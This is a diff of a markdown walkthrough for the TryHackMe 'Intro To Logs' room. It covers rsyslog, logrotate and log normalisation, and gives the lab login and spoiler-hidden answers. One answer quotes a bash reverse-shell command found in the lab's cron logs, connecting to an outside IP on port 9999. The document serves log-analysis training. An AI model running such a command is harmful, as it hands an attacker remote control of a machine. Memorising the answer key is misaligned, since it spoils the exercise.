@@ -7,6 +7,7 @@
 ### Introduction
 
 This is a guideo to [tryhackme: Intro To Logs](https://tryhackme.com/room/introtologs)
+
 Some nice graphics and a brief outline of learning outcomes.
 
 ### Expanding Perspectives: Logs as Evidence of Historical Activity
@@ -20,6 +21,7 @@ For this machine you actually don't really need a desktop so I just ssh in from 
 However you choose to connect the login credentials for damianhall are here
 
 login: damianhall
+
 password: Logs321!
 
 *Q1:  What is the name of your colleague who left a note on the Desktop?*
@@ -27,17 +29,19 @@ password: Logs321!
 > cat Desktop/note.txt (or open in the GUI) 
 
 <details>
+
   <summary>Spoiler warning: Answer</summary>
   
     Perry
 
 </details>
- 
+
 *Q2: What is  full path to the suggested log file for initial investigation?*
 
 > look in cat output of the note!
 
 <details>
+
   <summary>Spoiler warning: Answer</summary>
   
     /var/log/gitlab/nginx/access.log
@@ -51,7 +55,9 @@ There's a lot of good information here about log types and how they are structur
 *Q1: Based on the list of log types in this task, what log type is used by the log file specified in the note from Task 2?*
 
 > Task 2 was discussing an Nginx server which is a web server...
+
 <details>
+
   <summary>Spoiler warning: Answer</summary>
 
     Web Server Log 
@@ -63,12 +69,12 @@ There's a lot of good information here about log types and how they are structur
 > The materials clearly list what format the Nginx web server uses by default.
 
 <details>
+
   <summary>Spoiler warning: Answer</summary>
     
     combined
 
 </details>
-
 
 ### Collection, Management, and Centralisation
 
@@ -79,7 +85,9 @@ Go through the exercises and configure rsyslog.
 *Q1 After configuring rsyslog for sshd, what username repeatedly appears in the sshd logs at /var/log/websrv-02/rsyslog_sshd.log, indicating failed login attempts or brute forcing?*
 
 > after you have done the exercises you should be able to view the log file - so run: cat /var/log/websrv-02/rsyslog_sshd.log Disconnected from invalid user ...
+
 <details>
+
   <summary>Spoiler warning: Answer</summary>
     
     stansimon
@@ -91,25 +99,24 @@ Go through the exercises and configure rsyslog.
 > cat /etc/rsyslog.d/99-websrv-02-cron.conf
 
 <details>
+
   <summary>Spoiler warning: Answer</summary>
     
     10.10.10.101
 
 </details>
 
-
 *Based on the generated logs in /var/log/websrv-02/rsyslog_cron.log, what command is being executed by the root user?*
 
 > cat /var/log/websrv-02/rsyslog_cron.log | grep -E 'root|CMD'
 
 <details>
+
   <summary>Spoiler warning: Answer</summary>
     
     /bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1"
 
 </details>
-
- 
 
 ### Storage, Retention and Deletion
 
@@ -122,6 +129,7 @@ Follow the practical activity to automate log rotation.
 > cat /etc/logrotate.d/99-websrv-02_cron.conf - if you followed the practical activity it should be pretty clear. 
 
 <details>
+
   <summary>Spoiler warning: Answer</summary>
     
     24
@@ -133,6 +141,7 @@ Follow the practical activity to automate log rotation.
 > See the output for the last question.
 
 <details>
+
   <summary>Spoiler warning: Answer</summary>
     
     hourly
@@ -164,6 +173,7 @@ Again follow the url (not the link) in your browser (connected to the THM networ
 > OK, this is the unparsed log file that we opened initially NOT the normalised and consolidated one. Hopefully you have it open. Follow the hint and click the dropdown next to the add filter.
 
 <details>
+
   <summary>Spoiler warning: Answer</summary>
     
     No date field
@@ -175,18 +185,19 @@ Again follow the url (not the link) in your browser (connected to the THM networ
 > This is what we did to the log file with all those awk sed and sort and uniq commands...
 
 <details>
+
   <summary>Spoiler warning: Answer</summary>
     
     normalisation
 
 </details>
 
-
 *What is the process of consolidating normalised logs to enhance the analysis of activities related to a specific IP address?*
 
 > This one isn't initially obvious unless you've really understood the reading at the start of this chapter. When we consolidate multiple logs we are really adding value to our log files. When we add extra context to a log in the form of say, an IP address we are performing xxxxxxxxxx on the log. Forgive my grammar the gerund form would be more natural here but the answer is the noun.
 
 <details>
+
   <summary>Spoiler warning: Answer</summary>
     
     enrichment
